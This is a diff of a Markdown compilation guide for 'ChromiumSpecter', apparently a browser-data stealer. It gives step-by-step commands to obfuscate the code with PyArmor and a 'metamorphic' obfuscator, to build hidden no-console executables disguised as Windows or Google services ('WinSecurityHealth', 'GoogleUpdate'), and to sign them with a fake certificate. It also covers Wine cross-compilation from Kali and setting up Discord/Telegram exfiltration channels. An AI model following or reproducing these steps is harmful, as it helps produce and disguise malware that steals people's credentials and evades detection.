@@ -1,46 +1,106 @@
-# 🛠️ Compilation Flows Guide
+# ⚙️ Professional Compilation Flows
 
-This document details the different methods available to generate the **ChromiumSpecter** stub.
+> [!NOTE]
+> **English Version** | [Versión en Español](COMPILATION_FLOWS.md)
+
+This guide details the two recommended workflows for generating the final **ChromiumSpecter** executable, covering both hybrid environments and pure Linux/WSL environments.
 
 ---
 
-## 🏎️ Flow A: Hybrid CLI (Fastest)
+## 🏗️ Flow A: Hybrid (Windows + WSL/Linux)
 
-Ideal for development and testing. Uses `build.py` directly from the terminal.
+**Recommended for: Maximum stability and ease of use.**
 
-### Requirements:
-* Windows 10/11
-* Python 3.10+
-* Local dependencies installed (`pip install -r requirements.txt`)
+This flow uses Windows for the heavy compilation part (where native APIs are present) and WSL/Linux for the security and stealth part (digital signing).
 
-### Execution:
+### 1. Preparation on Windows (PowerShell)
+
+Install the necessary dependencies:
+
+```powershell
+pip install pyarmor pyinstaller -r requirements.txt
+```
+
+### 2. Binary Compilation (Windows)
+
+Generate the `.exe` using the automation script with identity spoofing (e.g., mimicking a Windows service):
+
+```powershell
+python build.py --name "WinSecurityHealth" --preset microsoft --onefile --noconsole
+```
+
+*The result will be in `dist/ChromiumSpecter.exe`.*
+
+### 3. Digital Signing (WSL/Linux)
+
+Copy the file to your WSL environment and run the certification script:
+
 ```bash
-python build.py --name "SecurityUpdate" --icon "app.ico" --uac-admin
+bash autocert.sh dist/ChromiumSpecter.exe "YourSecurePassword"
 ```
 
 ---
 
-## 🍷 Flow B: Cross-Compile (Wine / Linux)
+## 🏗️ Flow B: Pure (WSL/Linux with Wine)
 
-Designed for attack machines (Kali/Parrot) to avoid exposing the development environment on Windows.
+**Recommended for: Pentesting from isolated environments or distributions like Kali Linux.**
 
-### Requirements:
-* Linux
-* Wine 6.0+
-* Python installed inside Wine
+This flow allows generating a Windows executable without leaving Linux, emulating the Windows environment using Wine.
 
-### Execution:
+### 1. Wine Prefix Configuration
+
+Create a clean 64-bit environment to avoid conflicts:
+
 ```bash
-wine python build.py --name "SystemFix" --no-obf
+export WINEPREFIX=$HOME/.wine_chromium
+export WINEARCH=win64
+winecfg  # Ensure the Windows version is set to 'Windows 10'
 ```
 
----
+### 2. Python Installation for Windows in Wine
+
+Download the official Windows installer (`python-3.x-amd64.exe`) from python.org and run it:
+
+```bash
+wine python-3.11.x-amd64.exe /quiet InstallAllUsers=1 PrependPath=1
+```
+
+### 3. Dependency Installation inside Wine
+
+Use the emulated `pip` to install the Windows libraries:
+
+```bash
+wine python -m pip install --upgrade pip
+wine python -m pip install pycryptodomex pywin32 requests pyarmor pyinstaller
+```
+
+> [!IMPORTANT]
+> If `pywin32` fails, run this post-installation command:
+> `wine python Scripts/pywin32_postinstall.py -install`
+
+### 4. Metamorphic Compilation
+
+Run the entire process under Wine:
+
+```bash
+wine python ofuscator.py main.py
+wine python build.py --name "GoogleUpdate" --preset google --onefile --noconsole
+```
+
+### 5. In-Situ Signing
+
+Sign the binary directly from your Linux terminal:
+
+```bash
+bash autocert.sh dist/ChromiumSpecter.exe
+```
 
 ## 🎛️ Flow C: Dashboard Builder (Recommended)
 
-The easiest and most powerful method, using the integrated graphical interface to configure and generate the executable.
+This is the easiest and most powerful method, using the integrated graphical interface to configure and generate the executable.
 
-### Steps:
+### Steps
+
 1. **Exfiltration Tab**: Configure and verify your channels (Discord/Telegram). Save the settings.
 2. **Compilation Tab (Builder)**:
     * **Metadata**: Define the executable name, company, version, and icon.
@@ -68,3 +128,5 @@ The easiest and most powerful method, using the integrated graphical interface t
 ## ⚖️ Pentesting Recommendation
 
 If you are operating from an attack machine (Kali Linux), **Flow B** allows you to keep your entire supply chain inside Linux, minimizing the exposure of your development tools on Windows systems that might be monitored.
+
+
